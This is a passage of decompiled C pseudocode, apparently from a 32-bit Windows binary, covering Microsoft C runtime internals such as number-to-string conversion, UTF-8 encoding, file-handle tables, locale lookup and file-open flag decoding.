    "          if ( v194 >= 0x73 )",
    "            goto LABEL_187;",
    "          v195[v194++] = v98;",
    "        }",
    "      }",
    "    }",
    "  }",
    "LABEL_250:",
    "  v134 = v181;",
    "  v135 = v181;",
    "  v136 = v196;",
    "  v188 = v181;",
    "  if ( v196 )",
    "  {",
    "    v137 = 0;",
    "    v138 = 0;",
    "    do",
    "    {",
    "      v139 = 10LL * (unsigned int)Destination[v138];",
    "      v140 = 10 * Destination[v138];",
    "      Destination[v138] = v137 + v140;",
    "      v141 = __PAIR64__(HIDWORD(v139), v137) + (unsigned int)v140;",
    "      ++v138;",
    "      v137 = HIDWORD(v141);",
    "    }",
    "    while ( v138 != v136 );",
    "    v135 = v188;",
    "    if ( HIDWORD(v141) )",
    "    {",
    "      if ( v196 >= 0x73 )",
    "      {",
    "        v166 = 0;",
    "        v196 = 0;",
    "        memcpy_s(Destination, 0x1CCu, v167, 0);",
    "      }",
    "      else",
    "      {",
    "        Destination[v196++] = HIDWORD(v141);",
    "      }",
    "    }",
    "    v134 = v135;",
    "  }",
    "  v142 = sub_10025D10((int *)&v196, &v194);",
    "  if ( v142 == 10 )",
    "  {",
    "    ++v182;",
    "    v135 = v134 + 1;",
    "    v143 = v194;",
    "    *v134 = 49;",
    "    v188 = v134 + 1;",
    "    if ( v143 )",
    "    {",
    "      v144 = 0;",
    "      v145 = v143;",
    "      for ( k = 0; k != v145; ++k )",
    "      {",
    "        v147 = 10LL * (unsigned int)v195[k];",
    "        v195[k] = v144 + v147;",
    "        v144 = (v147 + (unsigned __int64)v144) >> 32;",
    "      }",
    "      v135 = v188;",
    "      if ( v144 )",
    "      {",
    "        if ( v194 >= 0x73 )",
    "        {",
    "          v166 = 0;",
    "          v194 = 0;",
    "          memcpy_s(v195, 0x1CCu, v167, 0);",
    "        }",
    "        else",
    "        {",
    "          v195[v194++] = v144;",
    "        }",
    "      }",
    "    }",
    "    goto LABEL_269;",
    "  }",
    "  if ( v142 )",
    "  {",
    "    v135 = v134 + 1;",
    "    *v134 = v142 + 48;",
    "    v188 = v134 + 1;",
    "LABEL_269:",
    "    v148 = v182;",
    "    goto LABEL_270;",
    "  }",
    "  v148 = v182 - 1;",
    "LABEL_270:",
    "  v173[1] = v148;",
    "  v149 = v174;",
    "  if ( v148 >= 0 && (unsigned int)v174 <= 0x7FFFFFFF && !a3 )",
    "    v149 = &v174[v148];",
    "  if ( SizeInBytes - 1 < (unsigned int)v149 )",
    "    v149 = (char *)(SizeInBytes - 1);",
    "  v150 = 0;",
    "  v174 = &v149[(_DWORD)v181];",
    "  for ( m = 0; v135 != v174; v188 = v135 )",
    "  {",
    "    if ( !v196 )",
    "      break;",
    "    v151 = 0;",
    "    v152 = v196;",
    "    for ( n = 0; n != v152; ++n )",
    "    {",
    "      v154 = 1000000000LL * (unsigned int)Destination[n];",
    "      v155 = 1000000000 * Destination[n];",
    "      Destination[n] = v151 + v155;",
    "      v156 = __PAIR64__(HIDWORD(v154), v151) + (unsigned int)v155;",
    "      v151 = HIDWORD(v156);",
    "    }",
    "    v157 = v188;",
    "    if ( HIDWORD(v156) )",
    "    {",
    "      if ( v196 >= 0x73 )",
    "      {",
    "        v166 = 0;",
    "        v196 = 0;",
    "        memcpy_s(Destination, 0x1CCu, v167, 0);",
    "      }",
    "      else",
    "      {",
    "        Destination[v196++] = HIDWORD(v156);",
    "      }",
    "    }",
    "    v158 = sub_10025D10((int *)&v196, &v194);",
    "    v159 = 8;",
    "    v160 = (char *)(v174 - v157);",
    "    do",
    "    {",
    "      v161 = v158 % v177;",
    "      v158 /= v177;",
    "      v162 = v161 + 48;",
    "      if ( (unsigned int)v160 > v159 )",
    "      {",
    "        v157[v159] = v162;",
    "      }",
    "      else if ( v162 != 48 )",
    "      {",
    "        v150 = 1;",
    "        m = 1;",
    "        goto LABEL_290;",
    "      }",
    "      v150 = m;",
    "LABEL_290:",
    "      --v159;",
    "    }",
    "    while ( v159 != -1 );",
    "    v163 = v174 - v157;",
    "    if ( (unsigned int)(v174 - v157) > 9 )",
    "      v163 = 9;",
    "    v135 = &v157[v163];",
    "  }",
    "  *v135 = 0;",
    "  if ( v196 || v150 )",
    "    v6 = 0;",
    "  sub_1002A110((char *)&v179 + 4, v171, v172);",
    "LABEL_298:",
    "  if ( v170 )",
    "    sub_1002A1A0(&Env);",
    "  return v6;",
    "}",
    "",
    "",
    "int sub_100276C0()",
    "{",
    "  int control; // eax",
    "",
    "  control = __acrt_fenv_get_control();",
    "  return sub_1002A91F(control);",
    "}",
    "",
    "",
    "unsigned int __usercall sub_100276CF@<eax>(",
    "        struct __crt_cached_ptd_host *a1@<esi>,",
    "        _BYTE *a2,",
    "        unsigned int a3,",
    "        __crt_mbstring *a4,",
    "        struct _Mbstatet *a5)",
    "{",
    "  unsigned int v6; // ecx",
    "  char v7; // bl",
    "  int v8; // esi",
    "  int v9; // edi",
    "  char v10; // al",
    "  int v11; // [esp-Ch] [ebp-Ch]",
    "",
    "  if ( !a2 )",
    "    goto LABEL_2;",
    "  v6 = a3;",
    "  if ( !a3 )",
    "  {",
    "    *a2 = 0;",
    "LABEL_2:",
    "    *(_DWORD *)a4 = 0;",
    "    *((_DWORD *)a4 + 1) = 0;",
    "    return 1;",
    "  }",
    "  if ( (a3 & 0xFFFFFF80) == 0 )",
    "  {",
    "    *a2 = a3;",
    "    return 1;",
    "  }",
    "  if ( (a3 & 0xFFFFF800) == 0 )",
    "  {",
    "    v7 = -64;",
    "    v8 = 1;",
    "    goto LABEL_18;",
    "  }",
    "  if ( (a3 & 0xFFFF0000) != 0 )",
    "  {",
    "    if ( (a3 & 0xFFE00000) == 0 && a3 <= 0x10FFFF )",
    "    {",
    "      v11 = 3;",
    "      v7 = -16;",
    "      goto LABEL_17;",
    "    }",
    "    return __crt_mbstring::return_illegal_sequence(a4, a5, a1);",
    "  }",
    "  if ( a3 >= 0xD800 && a3 <= 0xDFFF )",
    "    return __crt_mbstring::return_illegal_sequence(a4, a5, a1);",
    "  v11 = 2;",
    "  v7 = -32;",
    "LABEL_17:",
    "  v8 = v11;",
    "LABEL_18:",
    "  v9 = v8;",
    "  do",
    "  {",
    "    v10 = v6;",
    "    v6 >>= 6;",
    "    a2[v9--] = v10 & 0x3F | 0x80;",
    "  }",
    "  while ( v9 );",
    "  *a2 = v6 | v7;",
    "  return __crt_mbstring::reset_and_return((__crt_mbstring *)(v8 + 1), (unsigned int)a4, (struct _Mbstatet *)a1);",
    "}",
    "",
    "",
    "__crt_mbstring *__cdecl __crt_mbstring::reset_and_return(__crt_mbstring *this, _DWORD *a2)",
    "{",
    "  *a2 = 0;",
    "  a2[1] = 0;",
    "  return this;",
    "}",
    "",
    "",
    "unsigned int __cdecl __crt_mbstring::return_illegal_sequence(__crt_mbstring *this, struct _Mbstatet *a2)",
    "{",
    "  *(_DWORD *)this = 0;",
    "  *((_DWORD *)this + 1) = 0;",
    "  LOBYTE(a2[3]._Byte) = 1;",
    "  a2[3]._Wchar = 42;",
    "  return -1;",
    "}",
    "",
    "",
    "int __cdecl _isatty(int FileHandle)",
    "{",
    "  if ( FileHandle == -2 )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "  }",
    "  else",
    "  {",
    "    if ( FileHandle >= 0 && FileHandle < (unsigned int)dword_10040590 )",
    "      return *(_BYTE *)(&lpCriticalSection[(unsigned int)FileHandle >> 6][1].LockSemaphore + 14 * (FileHandle & 0x3F))",
    "           & 0x40;",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "    _invalid_parameter_noinfo();",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "char *__acrt_lowio_create_handle_array()",
    "{",
    "  char *v0; // eax",
    "  char *v1; // esi",
    "  char *v2; // edi",
    "  char *v3; // esi",
    "  char *v5; // [esp+8h] [ebp-8h]",
    "",
    "  v0 = (char *)sub_10023CF0(0x40u, 0x38u);",
    "  v5 = v0;",
    "  if ( v0 )",
    "  {",
    "    v2 = v0 + 32;",
    "    v3 = v0 + 3584;",
    "    do",
    "    {",
    "      sub_10021DC3((struct _RTL_CRITICAL_SECTION *)(v2 - 32), 0xFA0u, 0);",
    "      *((_DWORD *)v2 - 2) = -1;",
    "      v2[13] &= 0xF8u;",
    "      *(_DWORD *)v2 = 0;",
    "      v2 += 56;",
    "      *((_DWORD *)v2 - 13) = 0;",
    "      *((_DWORD *)v2 - 12) = 168427520;",
    "      *(v2 - 44) = 10;",
    "      *(_DWORD *)(v2 - 42) = 0;",
    "      *(v2 - 38) = 0;",
    "    }",
    "    while ( v2 - 32 != v3 );",
    "    v1 = v5;",
    "  }",
    "  else",
    "  {",
    "    v1 = 0;",
    "  }",
    "  _free_base(0);",
    "  return v1;",
    "}",
    "",
    "",
    "void __cdecl __acrt_lowio_destroy_handle_array(LPCRITICAL_SECTION lpCriticalSection)",
    "{",
    "  struct _RTL_CRITICAL_SECTION *v1; // edi",
    "",
    "  if ( lpCriticalSection )",
    "  {",
    "    v1 = lpCriticalSection;",
    "    do",
    "    {",
    "      DeleteCriticalSection(v1);",
    "      v1 = (struct _RTL_CRITICAL_SECTION *)((char *)v1 + 56);",
    "    }",
    "    while ( v1 != (struct _RTL_CRITICAL_SECTION *)&lpCriticalSection[149].RecursionCount );",
    "    _free_base(lpCriticalSection);",
    "  }",
    "}",
    "",
    "",
    "int __cdecl __acrt_lowio_ensure_fh_exists(unsigned int a1)",
    "{",
    "  int v1; // esi",
    "  int v3; // edi",
    "  int v4; // eax",
    "  char *handle_array; // eax",
    "",
    "  if ( a1 < 0x2000 )",
    "  {",
    "    v1 = 0;",
    "    __acrt_lock(7);",
    "    v3 = 0;",
    "    v4 = dword_10040590;",
    "    while ( (int)a1 >= v4 )",
    "    {",
    "      if ( !lpCriticalSection[v3] )",
    "      {",
    "        handle_array = __acrt_lowio_create_handle_array();",
    "        lpCriticalSection[v3] = (LPCRITICAL_SECTION)handle_array;",
    "        if ( !handle_array )",
    "        {",
    "          v1 = 12;",
    "          break;",
    "        }",
    "        v4 = dword_10040590 + 64;",
    "        dword_10040590 += 64;",
    "      }",
    "      ++v3;",
    "    }",
    "    __acrt_unlock(7);",
    "  }",
    "  else",
    "  {",
    "    v1 = 9;",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "    _invalid_parameter_noinfo();",
    "  }",
    "  return v1;",
    "}",
    "",
    "",
    "void __cdecl __acrt_lowio_lock_fh(int a1)",
    "{",
    "  EnterCriticalSection((LPCRITICAL_SECTION)((char *)lpCriticalSection[a1 >> 6] + 56 * (a1 & 0x3F)));",
    "}",
    "",
    "",
    "int __cdecl __acrt_lowio_set_os_handle(unsigned int a1, struct _RTL_CRITICAL_SECTION_DEBUG *hHandle)",
    "{",
    "  int v3; // [esp+8h] [ebp-4h]",
    "",
    "  if ( (a1 & 0x80000000) == 0",
    "    && a1 < dword_10040590",
    "    && (v3 = 56 * (a1 & 0x3F),",
    "        *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&lpCriticalSection[a1 >> 6][1].DebugInfo + v3) == (PRTL_CRITICAL_SECTION_DEBUG)-1) )",
    "  {",
    "    if ( sub_1002ABE3() == 1 )",
    "    {",
    "      if ( a1 )",
    "      {",
    "        if ( a1 == 1 )",
    "        {",
    "          SetStdHandle(0xFFFFFFF5, hHandle);",
    "        }",
    "        else if ( a1 == 2 )",
    "        {",
    "          SetStdHandle(0xFFFFFFF4, hHandle);",
    "        }",
    "      }",
    "      else",
    "      {",
    "        SetStdHandle(0xFFFFFFF6, hHandle);",
    "      }",
    "    }",
    "    *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&lpCriticalSection[a1 >> 6][1].DebugInfo + v3) = hHandle;",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "    *(_DWORD *)sub_1001E010() = 0;",
    "    return -1;",
    "  }",
    "}",
    "",
    "",
    "void __cdecl __acrt_lowio_unlock_fh(int a1)",
    "{",
    "  LeaveCriticalSection((LPCRITICAL_SECTION)((char *)lpCriticalSection[a1 >> 6] + 56 * (a1 & 0x3F)));",
    "}",
    "",
    "",
    "int _alloc_osfhnd()",
    "{",
    "  int v0; // ebx",
    "  int i; // edi",
    "  LPCRITICAL_SECTION v2; // eax",
    "  char *handle_array; // eax",
    "  struct _RTL_CRITICAL_SECTION *v5; // ecx",
    "  LPCRITICAL_SECTION j; // esi",
    "  int v7; // esi",
    "  int v8; // ecx",
    "  LPCRITICAL_SECTION v9; // [esp+14h] [ebp-28h]",
    "  LONG *p_RecursionCount; // [esp+1Ch] [ebp-20h]",
    "",
    "  __acrt_lock(7);",
    "  v0 = -1;",
    "  for ( i = 0; i < 128; ++i )",
    "  {",
    "    v2 = lpCriticalSection[i];",
    "    v9 = v2;",
    "    if ( !v2 )",
    "    {",
    "      handle_array = __acrt_lowio_create_handle_array();",
    "      lpCriticalSection[i] = (LPCRITICAL_SECTION)handle_array;",
    "      if ( handle_array )",
    "      {",
    "        dword_10040590 += 64;",
    "        v0 = i << 6;",
    "        __acrt_lowio_lock_fh(i << 6);",
    "        LOBYTE(lpCriticalSection[i << 6 >> 6][1].LockSemaphore) = 1;",
    "      }",
    "      break;",
    "    }",
    "    v5 = (LPCRITICAL_SECTION)((char *)v2 + 3584);",
    "    p_RecursionCount = &v2[149].RecursionCount;",
    "    for ( j = lpCriticalSection[i]; j != v5; j = (LPCRITICAL_SECTION)((char *)j + 56) )",
    "    {",
    "      if ( ((int)j[1].LockSemaphore & 1) == 0 )",
    "      {",
    "        EnterCriticalSection(j);",
    "        if ( ((int)j[1].LockSemaphore & 1) == 0 )",
    "        {",
    "          v7 = (i << 6) + ((char *)j - (char *)v9) / 56;",
    "          v8 = 56 * (v7 & 0x3F);",
    "          *((_BYTE *)&lpCriticalSection[v7 >> 6][1].LockSemaphore + v8) = 1;",
    "          *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&lpCriticalSection[v7 >> 6][1].DebugInfo + v8) = (PRTL_CRITICAL_SECTION_DEBUG)-1;",
    "          v0 = v7;",
    "          goto LABEL_6;",
    "        }",
    "        LeaveCriticalSection(j);",
    "        v5 = (struct _RTL_CRITICAL_SECTION *)p_RecursionCount;",
    "      }",
    "    }",
    "  }",
    "LABEL_6:",
    "  __acrt_unlock(7);",
    "  return v0;",
    "}",
    "",
    "",
    "int __cdecl _free_osfhnd(unsigned int a1)",
    "{",
    "  int v1; // edi",
    "  LPCRITICAL_SECTION v2; // eax",
    "",
    "  if ( (a1 & 0x80000000) != 0",
    "    || a1 >= dword_10040590",
    "    || (v1 = 56 * (a1 & 0x3F), v2 = lpCriticalSection[a1 >> 6], (*((_BYTE *)&v2[1].LockSemaphore + v1) & 1) == 0)",
    "    || *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&v2[1].DebugInfo + v1) == (PRTL_CRITICAL_SECTION_DEBUG)-1 )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "    *(_DWORD *)sub_1001E010() = 0;",
    "    return -1;",
    "  }",
    "  else",
    "  {",
    "    if ( sub_1002ABE3() == 1 )",
    "    {",
    "      if ( a1 )",
    "      {",
    "        if ( a1 == 1 )",
    "        {",
    "          SetStdHandle(0xFFFFFFF5, 0);",
    "        }",
    "        else if ( a1 == 2 )",
    "        {",
    "          SetStdHandle(0xFFFFFFF4, 0);",
    "        }",
    "      }",
    "      else",
    "      {",
    "        SetStdHandle(0xFFFFFFF6, 0);",
    "      }",
    "    }",
    "    *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&lpCriticalSection[a1 >> 6][1].DebugInfo + v1) = (PRTL_CRITICAL_SECTION_DEBUG)-1;",
    "    return 0;",
    "  }",
    "}",
    "",
    "",
    "intptr_t __cdecl _get_osfhandle(int FileHandle)",
    "{",
    "  int v1; // ecx",
    "  LPCRITICAL_SECTION v2; // eax",
    "",
    "  if ( FileHandle == -2 )",
    "  {",
    "    *(_DWORD *)sub_1001E010() = 0;",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "  }",
    "  else",
    "  {",
    "    if ( FileHandle >= 0 && FileHandle < (unsigned int)dword_10040590 )",
    "    {",
    "      v1 = 56 * (FileHandle & 0x3F);",
    "      v2 = lpCriticalSection[(unsigned int)FileHandle >> 6];",
    "      if ( (*((_BYTE *)&v2[1].LockSemaphore + v1) & 1) != 0 )",
    "        return *(intptr_t *)((char *)&v2[1].DebugInfo + v1);",
    "    }",
    "    *(_DWORD *)sub_1001E010() = 0;",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "    _invalid_parameter_noinfo();",
    "  }",
    "  return -1;",
    "}",
    "",
    "",
    "int __cdecl GetTableIndexFromLocaleName(const wchar_t *a1)",
    "{",
    "  int v1; // edi",
    "  int v2; // ebx",
    "  int v3; // esi",
    "  int v4; // eax",
    "  int v5; // ecx",
    "",
    "  v1 = 0;",
    "  v2 = 227;",
    "  while ( 1 )",
    "  {",
    "    v3 = (v2 + v1) / 2;",
    "    v4 = sub_10027CBD(a1, *(&off_10034D90 + 2 * v3), 85);",
    "    if ( !v4 )",
    "      break;",
    "    v5 = v3 - 1;",
    "    if ( v4 >= 0 )",
    "      v5 = v2;",
    "    v2 = v5;",
    "    if ( v4 >= 0 )",
    "      v1 = v3 + 1;",
    "    if ( v1 > v5 )",
    "      return -1;",
    "  }",
    "  return dword_10034D94[2 * v3];",
    "}",
    "",
    "",
    "int __cdecl __acrt_DownlevelLocaleNameToLCID(wchar_t *a1)",
    "{",
    "  unsigned int TableIndexFromLocaleName; // eax",
    "",
    "  if ( a1 && (TableIndexFromLocaleName = GetTableIndexFromLocaleName(a1), TableIndexFromLocaleName < 0xE4) )",
    "    return dword_10033C70[2 * TableIndexFromLocaleName];",
    "  else",
    "    return 0;",
    "}",
    "",
    "",
    "int __cdecl sub_10027CBD(unsigned __int16 *a1, unsigned __int16 *a2, int a3)",
    "{",
    "  int v3; // esi",
    "  int result; // eax",
    "  int v6; // ecx",
    "  int v7; // edi",
    "  int v8; // edx",
    "  int v9; // ecx",
    "",
    "  v3 = a3;",
    "  if ( !a3 )",
    "    return 0;",
    "  do",
    "  {",
    "    v6 = *a1++;",
    "    v7 = v6 + 32;",
    "    if ( (unsigned int)(v6 - 65) > 0x19 )",
    "      v7 = v6;",
    "    v8 = *a2++;",
    "    v9 = v8 + 32;",
    "    if ( (unsigned int)(v8 - 65) > 0x19 )",
    "      v9 = v8;",
    "    result = v7 - v9;",
    "    if ( v7 != v9 )",
    "      break;",
    "    if ( !v7 )",
    "      break;",
    "    --v3;",
    "  }",
    "  while ( v3 );",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _strnicmp(const char *String1, const char *String2, size_t MaxCount)",
    "{",
    "  if ( dword_10040364 )",
    "    return _strnicmp_l(String1, String2, MaxCount, 0);",
    "  if ( String1 && String2 && MaxCount <= 0x7FFFFFFF )",
    "    return __ascii_strnicmp(String1, String2, MaxCount);",
    "  *(_DWORD *)sub_1001E025() = 22;",
    "  _invalid_parameter_noinfo();",
    "  return 0x7FFFFFFF;",
    "}",
    "",
    "",
    "int __cdecl _strnicmp_l(const char *String1, const char *String2, size_t MaxCount, _locale_t Locale)",
    "{",
    "  const char *v4; // edi",
    "  const char *v5; // ebx",
    "  size_t v7; // esi",
    "  int v8; // ecx",
    "  unsigned __int8 v9; // al",
    "  int v10; // ecx",
    "  unsigned __int8 v11; // al",
    "  int v12; // eax",
    "  int v13; // edx",
    "  _DWORD v14[3]; // [esp+4h] [ebp-14h] BYREF",
    "  char v15; // [esp+10h] [ebp-8h]",
    "  int v16; // [esp+14h] [ebp-4h]",
    "",
    "  v4 = String1;",
    "  if ( String1 && (v5 = String2) != 0 && (v7 = MaxCount, MaxCount <= 0x7FFFFFFF) )",
    "  {",
    "    if ( MaxCount )",
    "    {",
    "      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v14, Locale);",
    "      v8 = *(_DWORD *)(v14[1] + 148);",
    "      v16 = v8;",
    "      do",
    "      {",
    "        v9 = *v4++;",
    "        v10 = *(unsigned __int8 *)(v9 + v8);",
    "        v11 = *v5++;",
    "        v12 = *(unsigned __int8 *)(v11 + v16);",
    "        v13 = v10 - v12;",
    "        if ( v10 != v12 )",
    "          break;",
    "        if ( !v10 )",
    "          break;",
    "        v8 = v16;",
    "        --v7;",
    "      }",
    "      while ( v7 );",
    "      if ( v15 )",
    "        *(_DWORD *)(v14[0] + 848) &= ~2u;",
    "      return v13;",
    "    }",
    "    else",
    "    {",
    "      return 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return 0x7FFFFFFF;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl common_sopen_dispatch<char>(LPCCH lpMultiByteStr, int a2, int a3, int a4, int *a5, int a6)",
    "{",
    "  int v7; // eax",
    "  int v8; // edi",
    "  int v9; // [esp+10h] [ebp-20h] BYREF",
    "  int v10; // [esp+14h] [ebp-1Ch]",
    "  CPPEH_RECORD ms_exc; // [esp+18h] [ebp-18h]",
    "",
    "  if ( !a5 || (*a5 = -1, !lpMultiByteStr) || a6 && (a4 & 0xFFFFFE7F) != 0 )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return 22;",
    "  }",
    "  else",
    "  {",
    "    v9 = 0;",
    "    v10 = 0;",
    "    ms_exc.registration.TryLevel = 0;",
    "    v7 = _sopen_nolock((int)&v9, (int)a5, lpMultiByteStr, a2, a3, a4, a6);",
    "    v8 = v7;",
    "    v10 = v7;",
    "    ms_exc.registration.TryLevel = -2;",
    "    if ( v9 )",
    "    {",
    "      if ( v7 )",
    "        *((_BYTE *)&lpCriticalSection[*a5 >> 6][1].LockSemaphore + 56 * (*a5 & 0x3F)) &= ~1u;",
    "      __acrt_lowio_unlock_fh(*a5);",
    "    }",
    "    if ( v8 )",
    "      *a5 = -1;",
    "    return v8;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl configure_text_mode(int FileHandle, char a2, int a3, int a4, int a5, int a6, int a7, int a8, _BYTE *a9)",
    "{",
    "  int v9; // ebx",
    "  int v10; // esi",
    "  int v11; // eax",
    "  int v12; // ecx",
    "  unsigned int v13; // eax",
    "  __int64 v14; // rax",
    "  DWORD v15; // eax",
    "  int v16; // edx",
    "  unsigned int v18; // ecx",
    "  DWORD v19; // eax",
    "  int v20; // edx",
    "  DWORD v21; // eax",
    "  int v22; // edx",
    "  int v23; // eax",
    "  int v24; // eax",
    "  int v25; // eax",
    "  int v26; // eax",
    "  int v27; // [esp+Ch] [ebp-8h]",
    "  int PMode; // [esp+10h] [ebp-4h] BYREF",
    "",
    "  v9 = 0;",
    "  *a9 = 0;",
    "  if ( *((char *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + 56 * (FileHandle & 0x3F)) >= 0 )",
    "    return 0;",
    "  v10 = a8;",
    "  if ( (a8 & 0x74000) == 0 )",
    "  {",
    "    PMode = 0;",
    "    if ( _get_fmode(&PMode) )",
    "      _invoke_watson(0, 0, 0, 0, 0);",
    "    if ( (PMode & 0x74000) != 0 )",
    "      v10 = PMode & 0x74000 | a8;",
    "    else",
    "      v10 = a8 | 0x4000;",
    "  }",
    "  v11 = v10 & 0x74000;",
    "  v12 = 2;",
    "  v27 = 2;",
    "  if ( (v10 & 0x74000) == 0x4000 )",
    "  {",
    "    *a9 = 0;",
    "    goto LABEL_18;",
    "  }",
    "  switch ( v11 )",
    "  {",
    "    case 65536:",
    "    case 81920:",
    "      if ( (v10 & 0x301) != 0x301 )",
    "        break;",
    "LABEL_16:",
    "      *a9 = 2;",
    "      break;",
    "    case 131072:",
    "    case 147456:",
    "      goto LABEL_16;",
    "    case 262144:",
    "    case 278528:",
    "      *a9 = 1;",
    "      break;",
    "  }",
    "LABEL_18:",
    "  if ( (v10 & 0x70000) == 0 || (a2 & 0x40) != 0 )",
    "    return 0;",
    "  v13 = a3 & 0xC0000000;",
    "  if ( (a3 & 0xC0000000) != 0x40000000 )",
    "  {",
    "    if ( v13 == 0x80000000 )",
    "      goto LABEL_33;",
    "    if ( v13 != -1073741824 )",
    "      return 0;",
    "  }",
    "  if ( a4 != 1 && a4 != 2 )",
    "  {",
    "    if ( a4 != 3 && a4 != 4 )",
    "    {",
    "      if ( a4 != 5 )",
    "        return 0;",
    "      goto LABEL_46;",
    "    }",
    "    LODWORD(v14) = _lseeki64_nolock(FileHandle, 0, 2u);",
    "    if ( v14 )",
    "    {",
    "      v15 = _lseeki64_nolock(FileHandle, 0, 0);",
    "      if ( (v16 & v15) == 0xFFFFFFFF )",
    "        return *(_DWORD *)sub_1001E025();",
    "      if ( (a3 & 0x80000000) == 0 )",
    "        return 0;",
    "LABEL_33:",
    "      PMode = 0;",
    "      v18 = sub_10022F2D(FileHandle, (LPWSTR)&PMode, 3u);",
    "      if ( v18 == -1 )",
    "        return *(_DWORD *)sub_1001E025();",
    "      if ( v18 != 2 )",
    "      {",
    "        if ( v18 != 3 )",
    "          goto LABEL_43;",
    "        if ( PMode == 12565487 )",
    "        {",
    "          *a9 = 1;",
    "          return 0;",
    "        }",
    "      }",
    "      if ( (unsigned __int16)PMode == 65534 )",
    "      {",
    "        *(_DWORD *)sub_1001E025() = 22;",
    "        return *(_DWORD *)sub_1001E025();",
    "      }",
    "      if ( (unsigned __int16)PMode == 65279 )",
    "      {",
    "        v19 = _lseeki64_nolock(FileHandle, (LARGE_INTEGER)2LL, 0);",
    "        if ( (v20 & v19) != 0xFFFFFFFF )",
    "        {",
    "          *a9 = 2;",
    "          return 0;",
    "        }",
    "        return *(_DWORD *)sub_1001E025();",
    "      }",
    "LABEL_43:",
    "      v21 = _lseeki64_nolock(FileHandle, 0, 0);",
    "      if ( (v22 & v21) != 0xFFFFFFFF )",
    "        return 0;",
    "      return *(_DWORD *)sub_1001E025();",
    "    }",
    "    v12 = 2;",
    "  }",
    "LABEL_46:",
    "  v23 = (char)*a9;",
    "  PMode = 0;",
    "  v24 = v23 - 1;",
    "  if ( !v24 )",
    "  {",
    "    v12 = 3;",
    "    v27 = 3;",
    "    v25 = 12565487;",
    "LABEL_50:",
    "    PMode = v25;",
    "    while ( 1 )",
    "    {",
    "      v26 = _write(FileHandle, (char *)&PMode + v9, v12 - v9);",
    "      if ( v26 == -1 )",
    "        break;",
    "      v12 = v27;",
    "      v9 += v26;",
    "      if ( v27 <= v9 )",
    "        return 0;",
    "    }",
    "    return *(_DWORD *)sub_1001E025();",
    "  }",
    "  if ( v24 == 1 )",
    "  {",
    "    v25 = 65279;",
    "    goto LABEL_50;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "HANDLE __cdecl create_file(",
    "        const WCHAR *lpFileName,",
    "        struct _SECURITY_ATTRIBUTES *lpSecurityAttributes,",
    "        int a3,",
    "        DWORD dwDesiredAccess,",
    "        DWORD dwCreationDisposition,",
    "        DWORD dwShareMode,",
    "        int a7,",
    "        int a8)",
    "{",
    "  return CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, a8 | a7, 0);",
    "}",
    "",
    "",
    "unsigned int __cdecl decode_open_create_flags(__int16 a1)",
    "{",
    "  unsigned int v1; // eax",
    "",
    "  v1 = a1 & 0x700;",
    "  if ( v1 <= 0x400 )",
    "  {",
    "    if ( (a1 & 0x700) == 0x400 || (a1 & 0x700) == 0 )",
    "      return 3;",
    "    if ( v1 == 256 )",
    "      return 4;",
    "    if ( v1 != 512 )",
    "    {",
    "      if ( v1 == 768 )",
    "        return 2;",
    "      goto LABEL_14;",
    "    }",
    "    return 5;",
    "  }",
    "  if ( v1 != 1280 )",
    "  {",
    "    if ( v1 == 1536 )",
    "      return 5;",
    "    if ( v1 != 1792 )",
    "    {",
    "LABEL_14:",
    "      *(_DWORD *)sub_1001E025() = 22;",
    "      _invalid_parameter_noinfo();",
    "      return -1;",
    "    }",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "int __cdecl sub_1002820F(int a1, int a2, int a3, char a4)",
    "{",
    "  unsigned int v4; // eax",
    "  int v5; // eax",
    "  int v7; // [esp-4h] [ebp-14h]",
    "  int PMode; // [esp+Ch] [ebp-4h] BYREF",
    "",
    "  *(_BYTE *)a1 = 0;",
    "  if ( (a2 & 3) != 0 )",
    "  {",
    "    if ( (a2 & 3) == 1 )",
    "    {",
    "      v4 = 0x40000000;",
    "      if ( (a2 & 0x70000) != 0 && (a2 & 8) != 0 )",
    "        v4 = -1073741824;",
    "    }",
    "    else if ( (a2 & 3) == 2 )",
    "    {",
    "      v4 = -1073741824;",
    "    }",
    "    else",
    "    {",
    "      *(_DWORD *)sub_1001E025() = 22;",
    "      _invalid_parameter_noinfo();",
    "      v4 = -1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v4 = 0x80000000;",
    "  }",
    "  *(_DWORD *)(a1 + 4) = v4;",
    "  *(_DWORD *)(a1 + 8) = decode_open_create_flags(a2);",
    "  switch ( a3 )",
    "  {",
    "    case 16:",
    "      v5 = 0;",
    "      break;",
    "    case 32:",
    "      v5 = 1;",
    "      break;",
    "    case 48:",
    "      v7 = 2;",
    "      goto LABEL_19;",
    "    case 64:",
    "      v7 = 3;",
    "LABEL_19:",
    "      v5 = v7;",
    "      break;",
    "    case 128:",
    "      v5 = *(_DWORD *)(a1 + 4) == 0x80000000;",
    "      break;",
    "    default:",
    "      *(_DWORD *)sub_1001E025() = 22;",
    "      _invalid_parameter_noinfo();",
    "      v5 = -1;",
    "      break;",
    "  }",
    "  *(_DWORD *)(a1 + 20) = 0;",
    "  *(_DWORD *)(a1 + 12) = v5;",
